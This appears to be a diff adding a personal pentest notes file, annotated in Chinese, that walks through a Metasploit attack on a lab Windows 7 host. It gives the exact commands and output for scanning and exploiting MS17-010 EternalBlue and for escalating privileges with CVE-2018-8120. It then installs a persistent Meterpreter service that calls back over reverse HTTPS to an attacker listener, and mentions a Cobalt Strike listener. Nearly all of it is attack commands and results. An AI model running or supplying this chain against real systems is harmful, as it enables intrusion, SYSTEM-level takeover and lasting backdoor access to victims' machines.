@@ -1,0 +1,189 @@
+#win7-nat  自启动服务 回连 msf
+192.168.1.15 4431
+#msf开启监听
+windows/meterpreter/reverse_tcp
+
+常见远程攻击模块:
+msf6 exploit(windows/smb/ms08_067_netapi) > options
+
+msf6 exploit(windows/smb/ms06_040_netapi) > options
+
+msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > options
+
+
+扫描是否存在 ms17 010 永恒之蓝漏洞:
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.1.48
+# rhosts => 192.168.1.48
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+# [+] 192.168.1.48:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
+# [*] 192.168.1.48:445      - Scanned 1 of 1 hosts (100% complete)
+# [*] Auxiliary module execution completed
+
+
+使用ms17 010 进行攻击:
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.1.48
+# rhosts => 192.168.1.48
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set lport 4457
+# lport => 4457
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+# [*] Started reverse TCP handler on 192.168.1.15:4457 
+# [*] 192.168.1.48:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+# [+] 192.168.1.48:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
+# [*] 192.168.1.48:445      - Scanned 1 of 1 hosts (100% complete)
+# [+] 192.168.1.48:445 - The target is vulnerable.
+# [*] 192.168.1.48:445 - Connecting to target for exploitation.
+# [+] 192.168.1.48:445 - Connection established for exploitation.
+# [+] 192.168.1.48:445 - Target OS selected valid for OS indicated by SMB reply
+# [*] 192.168.1.48:445 - CORE raw buffer dump (40 bytes)
+# [*] 192.168.1.48:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 42  Windows 7 Home B
+# [*] 192.168.1.48:445 - 0x00000010  61 73 69 63 20 37 36 30 31 20 53 65 72 76 69 63  asic 7601 Servic
+# [*] 192.168.1.48:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
+# [+] 192.168.1.48:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+# [*] 192.168.1.48:445 - Trying exploit with 12 Groom Allocations.
+# [*] 192.168.1.48:445 - Sending all but last fragment of exploit packet
+# [*] 192.168.1.48:445 - Starting non-paged pool grooming
+# [+] 192.168.1.48:445 - Sending SMBv2 buffers
+# [+] 192.168.1.48:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+# [*] 192.168.1.48:445 - Sending final SMBv2 buffers.
+# [*] 192.168.1.48:445 - Sending last fragment of exploit packet!
+# [*] 192.168.1.48:445 - Receiving response from exploit packet
+# [+] 192.168.1.48:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+# [*] 192.168.1.48:445 - Sending egg to corrupted connection.
+# [*] 192.168.1.48:445 - Triggering free of corrupted buffer.
+# [*] Sending stage (200774 bytes) to 192.168.1.48
+# [+] 192.168.1.48:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# [+] 192.168.1.48:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# [+] 192.168.1.48:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# [*] Meterpreter session 1 opened (192.168.1.15:4457 -> 192.168.1.48:49951) at 2023-07-09 00:07:11 +0800
+
+meterpreter > getuid
+# Server username: NT AUTHORITY\SYSTEM
+
+
+win7 利用漏洞 提升至系统权限  cve-2018-8120:
+meterpreter > background
+#[*] Backgrounding session 1...
+msf6 exploit(multi/handler) > sessions -l
+# Active sessions
+# ===============
+#   Id  Name  Type                     Information                    Connection
+#   --  ----  ----                     -----------                    ----------
+#   1         meterpreter x86/windows  WIN7-USER\win7nat @ WIN7-USER  192.168.1.15:4452 -> 192.168.1.48:49638 (192.1
+#                                                                     68.1.48)
+
+msf6 exploit(windows/local/ms18_8120_win32k_privesc) > set session 1
+#session => 1
+
+msf6 exploit(windows/local/ms18_8120_win32k_privesc) > set lport 4453
+#lport => 4453
+
+msf6 exploit(windows/local/ms18_8120_win32k_privesc) > options
+# Module options (exploit/windows/local/ms18_8120_win32k_privesc):
+#    Name     Current Setting  Required  Description
+#    ----     ---------------  --------  -----------
+#    SESSION  1                yes       The session to run this module on
+# Payload options (windows/meterpreter/reverse_tcp):
+#    Name      Current Setting  Required  Description
+#    ----      ---------------  --------  -----------
+#    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+#    LHOST     192.168.1.15     yes       The listen address (an interface may be specified)
+#    LPORT     4453             yes       The listen port
+
+msf6 exploit(windows/local/ms18_8120_win32k_privesc) > run
+# [*] Started reverse TCP handler on 192.168.1.15:4453 
+# [*] Sending stage (175686 bytes) to 192.168.1.48
+# [+] Exploit finished, wait for privileged payload execution to complete.
+# [*] Meterpreter session 2 opened (192.168.1.15:4453 -> 192.168.1.48:49639) at 2023-06-27 22:45:34 +0800
+
+meterpreter > getuid
+#Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > getsid
+#Server SID: S-1-5-18
+
+
+注册自启动 服务程序   系统权限:
+msf6 exploit(windows/local/persistence_service) > set lhost 192.168.1.44
+lhost => 192.168.1.44
+
+msf6 exploit(windows/local/persistence_service) > set session 2
+#session => 2
+
+msf6 exploit(windows/local/persistence_service) > set lport 8430
+#lport => 8430
+
+msf6 exploit(windows/local/persistence_service) > set payload windows/meterpreter/reverse_https
+#payload => windows/meterpreter/reverse_https
+
+msf6 exploit(windows/local/persistence_service) > options
+# Module options (exploit/windows/local/persistence_service):
+#    Name                 Current Setting  Required  Description
+#    ----                 ---------------  --------  -----------
+#    REMOTE_EXE_NAME                       no        The remote victim name. Random string as default.
+#    REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use temp directory as defaul
+#                                                    t.
+#    RETRY_TIME           5                no        The retry time that shell connect failed. 5 seconds as default.
+#    SERVICE_DESCRIPTION                   no        The description of service. Random string as default.
+#    SERVICE_NAME                          no        The name of service. Random string as default.
+#    SESSION              2                yes       The session to run this module on
+# Payload options (windows/meterpreter/reverse_https):
+#    Name      Current Setting  Required  Description
+#    ----      ---------------  --------  -----------
+#    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+#    LHOST     192.168.1.44     yes       The local listener hostname
+#    LPORT     8430             yes       The local listener port
+#    LURI                       no        The HTTP Path
+
+msf6 exploit(windows/local/persistence_service) > run
+# [-] Handler failed to bind to 192.168.1.44:8430
+# [*] Started HTTPS reverse handler on https://0.0.0.0:8430
+# [*] Running module against WIN7-USER
+# [+] Meterpreter service exe written to C:\Users\win7nat\AppData\Local\Temp\XEjOndYa.exe
+# [*] Creating service ZwDtfNd
+# [*] Cleanup Meterpreter RC File: /home/momoda/.msf4/logs/persistence/WIN7-USER_20230627.5933/WIN7-USER_20230627.5933.rc
+
+cobaltstrike 客户端创建 https监听器
+#win-auto-system-https 192.168.1.44 8430
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
